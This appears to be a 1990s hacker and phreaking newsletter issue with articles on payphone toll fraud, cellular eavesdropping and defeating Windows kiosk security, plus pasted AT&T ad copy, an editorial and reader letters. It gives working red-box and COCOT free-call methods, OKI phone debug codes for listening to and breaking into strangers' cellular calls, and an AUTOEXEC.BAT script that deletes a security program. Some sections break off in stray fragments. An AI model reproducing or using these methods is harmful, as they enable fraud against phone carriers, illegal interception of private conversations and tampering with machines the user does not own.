    Welcome to the Masters of Technology newsletter.  We aren't another lame
group, just a publisher of information such as Phrack.  Anyone can write for
MOT, just send me the article at "Gfather@cris.com", or at the L0pht BBS.
    Some of these philes were not sent to me, but I grabbed them and since
they hadn't been published anywhere else, decided to throw them in.
          
Greetz to:  Cyber Link, Mind Rape (I'll call, I'll call, give me time),
            Redboxchillipepper (You cool guy you), Mercenary, Mr. X (
            where the hell are you?), Crawl, Dark Tangent

Affilz:     You think this is a warez newsletter?  Jeez...  BTW, I want to
            be in the PLA so I can be a cool d00d, and distrubute k-radical
            PLA business cards all over town, and slaughter innocent gerbils.

Other mags
to read:    Because I didn't start this magazine to DRAW readers from any
            other magazines, I'll put in other mags I think are well worth
            your time.  For humor and phreaking, read the Phone Losers of
            America.  Their current issue is #38 I believe.  For ALL sorts
            of subjects, read Phrack.  Currently the issue is #47.  These
            are the more currently updated mags that are electronic and
            are free.

Articles
for MOT 
issue 3:    If I have time, I'll put together one on the Stromberg-Carlson
            DCO 17 switch.  That is the switch we have in my area.  I am
            going to have to call this MOTT (Masters of _Telephone_ 
            Technology) if I don't get more (or any) hacking articles. 
            Send those along.  Send me boards to put up in our BBS Update,
            I had to keep along the same ones.  Look for a good article
            in MOT #3, but I'm not telling you the subject :)

Grr.  Send me articles.  Jeez, how come Phrack gets all the fucking articles.
Doesn't anyone write stuff anymore?  I get tired of seeing my name on every
article in the mag.  I guess Phrack isn't doing real well either.  Oh well.
I'll continue putting out this magazine articles or not, but if you get
tired of my articles, fucking send me some.

A word to the wise :

Originally I wrote a textfile called 800-BBS.TXT. wihch explained how to 
setup and 800 number to your BBS.  A warning, THIS IS NOT SAFE anylonger.
AT&T has caught on, and in addition to veryifing that you actually ordered
the service, now they call you in a week to verify again, if they get a
Modem or Fax machine they find out who owns the local number [the BBS] and
calls them up, and even if you deny it, they can still make you pay the 
fee.  It is very expensive and AT&T aint fucking around any longer.  They
are busting boards now left and right, so if you wanna take the risq and do
it, be my guest,just keep in mind, there is now a 80% chance of getting busted
Also AT&T logs every call coming into a BBS [8oo number] and even tho they
have never done it to me, they might call to ask if you know the person at
the 800.  There is alot of ppl who have read my textfile and have been 
enlightened into how to do it, but you really didnt expect that AT&T was
going to let this go on forever, did you?

        I really dont care if you read this and care or not, im just warning
you becuz a few friends of mine who have used this method have had to pay       
outstanding bills of 10,000 dollars, no joke..  So i warned you, do whatever

: Hi,

: Could someone tell me how to get a free phone call on a pay fone??

       If the telephone is owned by the telephone company, then centralized 
equipment is used to determine how much money has been insertered into 
the telephone. This is done via a series of beeps sent by the pay telephone 
down the phone line depending on the amount of money inserted. The phone 
transmits one beep for a nickel, two for a dime, five for a quarter and so 
on. The centralized equipment detects these tones and remembers how much 
money has been inserted, and allows your call to proceed after the proper 
amount. Due to the nature of data sent on the telephone line, the pay 
telephone is not the only device able to make the proper tones. You can 
simulate the "sound" of coins being put into the payphone with a device 
called a 'red box'. 
       The net abounds with plans for red boxes, and you should look into 
some of the nicer ones, as they produce clear tones which match the 
payphones almost exactly. However, a perhaps easier option is to use a 
microcassette recorder and an answering machine together as follows: Go to a 
payphone, call your answering machine, then put several quarters into the 
phone while the machine is recording your message. This will record the 
sounds that quarters make when they are inserted into a pay telephone onto 
your answering machine. Then use a microcassette recorder to play the tape 
from the answering machine into the microphone of a payphone receiver 
after dialing a long distance number.
       In recent years, the phone companies have attempted to curtail red 
boxing by making the microphone inactive on its new pay phones while it waits
for money to be inserted. This makes it impossible to simply play the tones 
into the microphone and have them automatically sent out on the phone 
line, and it becomes a more difficult to trick the equipment. This can 
be circumvented by attaching a regular telephone to the coin line and using
it to make the call. Because the telephone companies control all billing
centrally, a normal phone will behave exactly like a payphone when
hooked to a coin line.
       If the pay phone is privately owned, it is called a COCOT (Customer 
Owned Coin Operated Telephone), or less commonly COPT (Customer Owned Pay
Telephone) These payphones are not affiliated with the telephone company,
so they cannot use the centralized money detection system and must do the
work internally. Some COCOTs are very easy to defraud. The common method is 
as follows:  
       The FCC requires that 800 numbers be dialable for free from any 
payphone (this includes COCOTs) on the belief that this will allow all long 
distance companies to be accessible from any phone. You can use this 
regulation against some COCOTs by dialing an 800 number and waiting until the 
person/machine hangs up. Most switches will return the dialtone at this 
time and you are free to make any calls anywhere (for free) because the 
phone still thinks you are on the 800 number. Actually, you can dial any 
number, with numbers that do not require a coin deposit being the obvious 
preference (0, etc) and wait until you are hung up on. The 'standard' number 
is 800 LOAN YES, which sometimes does not work, but there are many numbers 
with brief messages that disconnect you, we'll always have operators!
       You will find that almost all COCOTs respond differently to 800 
numbers that hang up on you. The vulnerable ones I have found allow me to 
hear about one second of dialtone before muting it out. If you begin 
dialing your number while the dialtone is audible it will work perfectly 
and connect you for free. You may need a Radio Shack tone dialer to make 
the DTMF tones to dial the phone if its keypad is turned off or does not 
make the real tones. These are relatively common practises and are easily 
bypassed with a simple tone dialer. You will probably find that most 
COCOTs will let you hear only dead air after the number hangs up on you, 
and after 30 seconds the recording "If you'd like to make a call..." 
comes on.  
       People posting the 800 method are often ridiculed because this 
hack is so old that it supposedly never works anymore. I personally have 
found three COCOTs vulnerable to this problem, it mostly depends on where you
find your COCOTs. Super Markets are a good place. Many of them have two 
or more COCOTs there and most are vulnerable to the hang up trick.
       Because the COCOT is not owned by the telephone company, it has a 
normal telephone line and does all billing internally. Payphones owned by 
the telephone company are just normal phones that make special tones 
when money is put into them. A regular (non-pay) telephone connected to a coin
line will still ask for "Three Dollars and Ten Cents" to be inserted for a 
long distance call. Obviously, this is not true for the COCOT. If you bypass 
the phone, by connecting your own phone to its telephone line you can dial 
long distance just as you would on any phone.
       Many COCOTs are very intelligent these days, and the they are 
rarely the easy target they once were. Your best bet is probably to red 
box off a telco phone. Its easier, and its less likely ever to be detected.

Note:  Some of this information came from The L0pht, but I expanded on it
       quite a bit. 


To enter debug mode:

Power the phone up.  Wait for PowerOn msg.  Hit 7 and 9 together.
Then hit Menu, Snd, End, Rcl, Sto, Clr.  Phone says "good timing!!!"
Debugger is now enabled, but phone works normally.  Hit 1 and 3
together to halt phone and enter debugger.  Everything on display
lights up.  Hit Clr until you get status display.

Now you can execute commands listed below.  For example to reboot phone
enter #, 0, 2, Snd.  Commands all start with # and end with Snd.  Some
take arguments.
                                                                             
You can use #25, to display memory in EEPROM, hit # and * to go up and down 
in memory, Clr to exit.  Hex chars are entered as "*n", like *1=A, *2=B, etc.

Okay, now to the stuff you can actually DO with this information.  I actually
figured out how to listen without help, but Dark Tangent and B-String (or
was it G-String) on the Defcon Voice Bridge told me how to actually break
in the cellular conversation.

Listening to people:

#12
#14           - This sets up the phone, unmutes audio, turns on speaker
#76

#73xxxxxxxx02 - Scans the cellular channels.  

When you scan for channels, the 02 tacked on the end says to pause 2 seconds
between channels.  Pressing "#" pauses at the current channel, "#" continues
after you have paused, "*" goes to the beginning of the scan.  

Breaking into the conversation:

#12           
#14
#670          - Sets up the phone.  Unmutes, turns on mic, turns on carrier
#77
#100

#07           - To speak into phone.  Depending on where you are in relation
                to the speakers, this might not work.

#08           - Stop talking to them

Don't abuse this, I don't want any recalls, or new phones without this neat
little debug mode.  This has been tested with the OKI 900 and 1325
phones.

Other things:

In my area, there are channels (0350, 0353) that make a warbling sound.
They do it always.  I have no explanation for that, but make note of things
like that, they could be open for exploration.

Don't think you will get multitudes of computer passwords or "secret"
information listening to people, usually it is EXTREMELY boring.  You can
always laugh at some bitch when she breaks up with her boyfriend, or at
some man talking to his wife about eating her pussy, but I have scanned a
LONG time, and the most I got was a phone number to another cellular phone.
Whoopie, big deal.

                              Full (No) Armor
                             By: The Godfather
                               Phile 5 of 7

    I hear you seasoned hackers saying how lame this phile is going to be,
and you're right.  But, some people actually think this is worth something,
and I am going to publish it.

Introduction
------------
You've heard of Full Armor.  Walmart machines have it, so do quite a few
businesses.  The tips in this phile are more directed towards Full Armor,
but most will work on ALL Windows "security" programs.  Full Armor protects
the machine from HD Formats (lame), and certain programs are unrunable,
plus you cannot delete icons, exit Windows (depending on security setting),
etc.  Anyway, there are times you want to actually do something on a 
computer, so here is how to get rid of the "protection".

Getting Started
---------------
You (might) need a floppy disk containing COMMAND.COM, you need little or
no balls, and an IQ above a house plant.  This phile is for Full Armor
running on Windows 3.1, or 3.11.

How to do the 3133+3 (sic) Hack
-------------------------------
Turn on the machine, or reboot if it has the added "protection" of that
stupid Packard Bell Explorer (name?) thing.  To get rid of Explorer, and 
quite a few frontends, simply hold both Shift Keys down while Windows starts.

If you minimize program manager, a "Full Armor" icon will be in the bottom
right corner.  Right click on it, and ask to uninstall it.  It will ask for
a password.  Just click on "About", and when that screen comes up, hit
"Alt-Ctrl-Delete", and press enter, until Full Armor has disappeared.  Good,
one layer is removed.

Note: If the machine allows you to exit windows, do the following, but
skip the word processor part, simply cd /DOS and use EDIT to edit the
AUTOEXEC.BAT file.

Find a word processor, any will do, even notepad.  Open AUTOEXEC.BAT,
hopefully that won't be write protected (yikes).  Turn everything to do
with Full Armor into mudpuddles (delete it).   Do the same with CONFIG.SYS.
Delete the "win" command so we don't have that problem.

Add the following to AUTOEXEC.BAT:

echo off
cd \
attrib *.* -r -s -h
cd \armor
attrib *.* -r -s -h
cd \windows
attrib *.* -r -s -h
cd \dos
attrib *.* -r- s -h
cd \
mkdir \armort
cd \armor
xcopy *.* \armort
ECHO y | del *.* 
echo on

Now save it, it should save, if it says cannot write to file, or write
protected, go to section "Error 1", then return to the beginning of this
step.  Otherwise, say goodbye to layer two, and reboot the computer.

Now simply edit WIN.INI and SYSTEM.INI and get rid of those pesky drivers
for ARMOR.  If you can't, then just start the system (windows) anyway,
you will just have to deal with a few "Cannot find..." messages.
Delete "STARTUP.GRP" to get rid of that Packard Bell thing permanently.
Make sure to edit PROGMAN.INI and edit out those restrictions on Exiting
Windows and deleting icons.

Note:  a REAL simple and clean way to get rid of this program, is to go 
to the /ARMOR (or /ARMORT) directory, and type UNINSTAL.  No password 
needed, but it is irreversible.  The password is stored in a file, but
is encrypted.  I think it should be easy to break the encryption though,
but not worth the trouble.

Now, wasn't that easy?  If you get caught, tell them you haven't erased the
program (you haven't), and just copy everything from /ARMORT to /ARMOR,
and put the drivers back in the .INIs, and replace the AUTOEXEC and CONFIG
files, and ta-da.  If you don't care about getting caught, don't make 
backups. 

Error 1
-------
So they were smart and put no-write flags with the ATTRIB command on the
"important files".  Oh hell, we MIGHT be fucked.  If you have COMMAND.COM
on a disk, use it.  If you can get File Manager, undo the attributes on the
"important files".  Use that brain of yours.  The weakness of all Windows
security is the DOS prompt.  The DOS prompt is pretty much like root
on a *nix.

       is 950, and customer service number.  "NOT-ANSW" means either (1)
       I couldn't get the service number, or (2) it wouldn't give me an
       operator to get it.  Most likely 2.  This is valid in the 214 NPA,
       some may be in others.  This is not a complete scan.

       time to get this the bloody faxes.

800 After Hours
---------------

Don't Leave Your Weekend and Nighttime Callers In The Dark.
Use AT&T 800 After Hours to Highlight Your Business Hours.

A simple sign in a window can inform customers who arrive after closing
time of the best time to return.  What if you could do the same thing for
customers who call your AT&T 800 number when you're not there?

That's the idea behind AT&T 800 After Hours, one of the new Advanced 800
Features packages designed to help meet the specific needs of business like
yours -- without complicated and expensive equipment.

With AT&T 800 After Hours, your customers won't be greeted by an unanswered 
phone or a fuzzy, unprofessional-sounding answering machine.  Instead a 
customized, professionally recorded message tells them the best times to call
back.  For example:

       "Thank you for calling XYZ Travel.  We are open to serve you from
        9 a.m. to 5 p.m., Monday through Friday.  Please call back during
        business hours."

Advanced 800 Features, Added 800 Value.
---------------------------------------

AT&T 800 After Hours can enhance your customer service when you're closed,
by giving your customers the information they need with a professionally 
recorded spoken message.  And that can mean more callbacks and increased
sales. 

Plus, AT&T 800 After Hours is part of the AT&T Network.  So you can enjoy
all the advantages of courteous customer service without the expense of 
purchasing and maintaining on-premises equipment and answering systems that
can break down.

You can also control 800 service usage charges after hours.  Calls do not 
reach your access lines, and you're charged only for the actual duration of 
your outgoing message.

What's more, AT&T 800 After Hours can also help combat fraud, because calls
made after hours terminate in the AT&T Network -- these calls simply don't
`get through' to your location.

To put AT&T 800 After Hours to work for your business, or for more infor-
mation, please call your AT&T Account Executive or call an AT&T Represent-
ative.

-----------------------

This Receptionist Speaks Up to 100 Languages, Answers 50,000 Calls an Hour,

Ideally, the perfect receptionist should handle all your calls promptly and
cheerfully -- 24 hours a day, 365 days a year.

That's the idea behind AT&T Incoming Call Attendant, one of our new Advanced
800 Features packages designed to help meet the specific needs of businesses
like yours -- without complicated and expensive equipment.

voice will greet your callers and connect them to the individual, department,
or location they are trying to reach.

Touch-tone callers need only respond to a simple prompt with their keypad
to be efficently and effectively routed.  (Rotary-dial callers can simply 
stay on the line to be routed wherever they wish.)
For example:

       "Thank you for calling XYZ Company.  For sales, press 1.  For 
       service, press 2.  For promotions, press 3."

Advanced 800 Features, Added 800 Value.

You may also save on usage plus receive additional savings on maintenace,,

Toll-Free Call Connector
------------------------

You Can't Control Where Your 800 Calls Are Coming From.
But Now You Can Have _Complete_ Control Over Where They're Answered.

Let's say you want your Boston office to handle all orders from the New
England states.  You want your New York office to do the same for the Mid-
Atlantic states.  Plus, all other calls should be routed to New York.

If you use one AT&T 800 number for all calls, how in the world can you be
sure the right call goes to the right location?

That's precisely the idea behind AT&T Toll-Free Call Connector, one of our
new Advanced 800 Features packages designed to help meet the needs of 
businesses like yours -- without complicated and expensive equipment.

With AT&T Toll-Free Call Connector, you can route calls from just around the
corner, another part of the country, or from around the world, with 
pinpoint accuracy.

You can route incoming calls based upon the local exchange code, area code,
and even the country of each caller.  Send calls to different call centers
based on the time of day or day of the week.  You can even designate the
percentage of calls you want each location, department, or _person_ to
handle.  Just tell us where you want your calls to go, and we'll do the
rest. 

Plus, AT&T Toll-Free Call Connector is so flexible, you can change your
allocation percentages* with just 5 minutes' notice.

How does this work in the real world?  Here's an example:

       In the scenario above, you would obviously want all calls from
       Massachusetts directed to your Boston office.  In addition, you
       can specify that calls from specific exchange codes should be
       sent to specific agents, e.g., all callers from the Boston area
       should be sent directly to Debbie for special handling.

       To keep servicing your customers after 5 p.m. without the expense
       of a second shift at both call centers, you could easily arrange
       for _all_ evening calls to be sent to your New York office.  What's
       more, AT&T Toll-Free Call Connector allows you to allocate these
       calls to individual representatives in New York - 60% to Dave,
       40% to Jonathan, and all international calls to Holly.

* Change charges apply.


++++  AT&T Interactive Fax  AT&T Easylink  WED JAN xx xx:57 xx  Page 4  ++++

With AT&T Toll-Free Call Connector, you can economically enhance your
customer service by providing extra hours of call answering -- without
keeping your call centers open one minute longer than usual.  

This, of course, is only one way to benefit from this incredibly versatile
Advanced 800 Features package.  Your AT&T Account Executive can help you
tailor its capabilities to fit your operation.

Advanced 800 Features, Added 800 Value
--------------------------------------

AT&T Toll-Free Call Connector can be your business's connection to more 
expeditious and appropriate call handling, and simplified staffing across
multiple locations.  All of which can quickly add up to maximum call 
completion, happier customers, and increased sales.

Plus, since AT&T Toll-Free Call Connector is built into the AT&T Network,
there's no special equipment required at your locations -- so you can save
even more.

To put AT&T Toll-Free Call Connector to work for your business, or for more
information, please call your Account Executive or call an AT&T 
Representative.

800 Caller Greeting
-------------------

Add a Personal Touch to the Way You Handle Your Customer's Calls.
And They'll Get the Right Message About Your Business.

Imagine customers calling your 800 number, but all your agents are busy.  If
you put them on hold, their patience could wear thin -- and you could lose
the calls. 

But if you greeted the customers right away with a friendly and informative
message, you'd show them that you appreciate their business -- and you'd
be more likely to _get_ their business.

That's the idea behind AT&T 800 Caller Greeting, one of five new Advanced
800 Features packages designed to help meet your specific business needs --
without complicated and expensive equipment.

With AT&T 800 Caller Greeting, you can provide a customized annoucement at
the beginning or at almost any point during your customer's call.

So instead of leaving your customers `hanging' while you route their calls,
you can tell them about certain aspects of your business that could 
generate new sales opportunities.  You can announce special sales, your
hours of operation and locations, new products, or your other 800 numbers,
to name a few.

You can also streamline the way you process calls, by providing customers
with answers to routine questions in advance.  For example:

       "Thank you for calling XYZ Computers.  If you're calling about 
       desktop models, please call 1 800 XXX-XXXX.  Otherwise, please
       hold, and an agent will be with you shortly."

You can also use AT&T 800 Caller Greeting to confirm a selection the caller 
made from an options menu.  For example:

       "Thank you for pressing 1 for service.  Please have your model
       number ready."

Of course, your message will be professionally recorded in the AT&T Network.
And you can deliver your message in English or in more than 100 different
languages.

Advanced 800 Features, Added 800 Value.
---------------------------------------

AT&T 800 Caller Greeting helps you provide customers with more personal
service, and that gives your customers good reason to keep calling back.


++++  AT&T Interactive Fax  AT&T Easylink  WED JAN xx xx:57 xx  Page 6  ++++

Plus, by providing customers with helpful information in advance, your
agents may spend less of their valuable time answering questions -- and more
time generating sales.

AT&T 800 Caller Greeting also helps you save on usage and maintenance
charges, because it requires no recording, answering, or playback equipment.

To put AT&T 800 Caller Greeting to work for your business, or for more
information, please call your Account Executive or an AT&T Representative.

Special Caller Handling
-----------------------

Your Customer's Special Needs Deserve Special Service.
And With Special Caller Handling, Now You Can Cater to Virtually Every Caller.

Suppose you want to provide preferential treatmeant to your most valued
customers by efficiently directing their calls to specific agents or 
departments.  Or perhaps you want to give these customers direct access to
confidential information such as their account balance.  At the same time,
new customers may simply be calling to place an order.

How do you cater to them all, without wasting their time, your agent's time,
and _your money_, routing calls from one department to another?

With AT&T 800 Service Special Caller Handling, that's how.  It's one of five
new Advanced 800 Features packages designed to help meet the specific needs
of your business -- without complicated or expensive equipment.

With AT&T Special Caller Handling, you set up in advance the type of 
information or service specific customers need.  So when they call, you can
screen and direct their calls based on the proper Account Codes, Personal
Identification Numbers, Identification Codes, or other numbers (up to 15
digits) enter by the caller.  For example:

       "Thank you for calling XYZ Cooperative Bank.  For information about
       your account, please enter your account number now.  For general
       information, please stay on the line."

Their calls can then be routed to a customized message or menu of options,
allowing you to further pinpoint how you can meet your customer's needs:

       *  You can designate a _special option for your most valued 
          customers_, which will give them the opportunity to receive
          preferential service.

       *  You can _route calls based on the originating city or state_.

       *  You can _prevent unauthorized calls from `getting through', by
          routing them to a generic or customized annoucement.  Or you
          can route overdue accounts to an annoucement that tells them
          to call the billing department.

       *  You can direct calls without the callers knowing they have been
          `pre-screened.'

Advanced 800 Features, Added 800 Value.
---------------------------------------

AT&T Special Caller Handling makes your toll-free program more efficient by:

       *  Speeding the call process

       *  Automatically answering particular calls with a pleasant,
          professionally recorded message, when appropriate, e.g., overdue
          accounts directed to call the billing department, unauthorized
          calls directed to a generic annoucement

       *  Reducing the time your agents spend on each call

       *  Eliminating human error and taking the guesswork out of where the
          call should be directed

       *  Handling each caller differently, based on their profile

It may translate into lower usage charges, better customer service, and more
sales opportunities for your business.

To put AT&T Special Caller Handling to work for your business, or for more
information, please call your Account Executive or call an AT&T Represent-
ative.

                                  Editorial
                              By: The Godfather

   Another fun filled editorial filled with my usual rants and raves.  This
issue, I'll look at the current state of alt.2600 the newsgroup, and the
AOLamer issue.

   Well, you just spent your time (and sometimes money) reading alt.2600.
Although you might have managed to glean a tiny nugget of information, the
newsgroup is filled with AOL.COM, GNN.COM (a subsidary of AOL), PRODIGY.COM,
and a few other domains, all with lamers dripping in their subscription
veins, all asking shitty stupid questions, bashing other (mostly very
knowledgeable) folks, and just being assholes (and don't forget the warez
puppies and the little kids who ask for dirty pics).
   Wait you say, the point is that lamers are SUPPOSED to learn.  You are
most certainly correct.  But lets take a quick peek into "The Godfather's
Dictionary", and see how I define "LAMER".

LAMER, n., A person that will never learn, or never wants to learn anything
           except where to get the latest dirty pics or warezzzzzzzzz.  See
           also scientific class "doofus idious".

Hopefully that gives you a better idea of what I am talking about when I say
"lamer".  
   Not everyone who asks a "stupid" question is a lamer (the kind I defined
above).  Maybe they haven't been EDUCATED about that sort of thing, but
meaningless bashing is NOT productive on either side.  Wait, I hear you
saying, newbies are supposed to learn by themselves.  I know, I learned by
myself.  Still, maybe a push in the right direction is better than calling
them "lamer punk ass".
    AOL.COM.  A domain that is shuned, and beat upon with the heavy stick
of lameness.  Still, I have been on AOL before.  Not for the inet access, 
but for their INFORMATION CONTENT.  I can read the New York Times, Time
Magazine, Wired, and other magazines in less time and effort than using 
their respective web pages.  After the artwork is downloaded, it is fast,
efficient, and looks nice.  "But, you have to pay a lousy $2.95 per hour".
Sheesh, can't you see the absolute FALICY off that.  Unless you spend hours
on the web, they do give you 5 hours free, plenty of time for reading the
newspaper and getting mail, plus its only $9.95 a month.  The cheapest IP
I have seen is $14.95 for SHELL account (which I prefer anyway).  Not to 
mention, you don't HAVE to pay for it with YOUR credit card.  Still, anyone
that calls him/herself a hacker because they got free AOL time or account(s),
is not "elite", or even a real hacker in a sense.
    Anyway, poke those pearls of wisdom into your brains, and see what 
surfaces.  Maybe an understanding of "lamers", "newbies", and "3133+3" 
people, or maybe you think I am the "lamer punk ass".  I dunno, and I don't
care.

If you disagree with me, go ahead and send me hate mail.  But after that
go send a letter to ROOT@CERT.ORG telling them your info and who you are 
going to hack next, and who's systems you have already penetrated.  They 
will help you I'm sure.  They are 3133+3.

From:  bspline (on IRC)

   In your editorial (MOT #1) you said "RM /R", that is incorrect.

                     - bspline

[ He's right, but I had been doing backups with that awful MS-DOS
  command, and was used to typing RESTORE /x, and didn't think about that.
  I always look through the articles to see if they are valid (but not all
  are tested), but I missed that.  You know what I really meant anyway. ]

From:  bspline (on IRC)

   In your "Blocking ANI" (MOT #1) article, you said ANI was analogous to 
   Caller ID.  That is wrong and untrue.

                      - bspline

[ I said it was "like" Caller ID, I DID NOT say it functioned the same way,
  I said specifically that they were different.  Next time send that to
  /dev/null please.  Besides, I said clearly in the article that I was going
  to BRIEFLY explain ANI.  Sheesh. ]

From:  bspline and kmem (on IRC)

   This magazine has too much beginner information.

[ So.  Not every article in Phrack is filled chock full with info on tech
  details either.  Besides, we will have too many people that don't know
  anything if there isn't SOME beginning info.  Don't forget, that was a 
  beginning newsletter.  My first one too.  If you want technical stuff, get
  me articles WITH tech stuff.  That one should never have been spoken, 
  not to mention sent to /dev/null. ]

                       - bspline and kmem

Note:  I did rag a little at bspline, but he is a really good phreak, and
       knows his stuff.  Don't take it the wrong way.
